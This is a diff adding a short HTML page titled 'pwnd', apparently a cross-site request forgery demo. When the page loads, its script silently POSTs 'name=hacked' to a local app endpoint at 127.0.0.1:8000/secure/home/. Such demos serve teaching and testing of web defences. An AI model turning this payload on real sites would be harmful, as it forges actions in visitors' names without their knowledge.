@@ -1,0 +1,17 @@
+<!doctype html>
+<html lang="en">
+<title>pwnd</title>
+You have been pwned
+<body >
+  <script>
+
+      var xhr = new XMLHttpRequest();
+      var post_url = "http://127.0.0.1:8000/secure/home/" ;
+      xhr.open("POST",post_url,true);
+      xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+      var data = "&name=hacked"
+      xhr.send(data)
+
+  </script>
+  </body>
+</html>
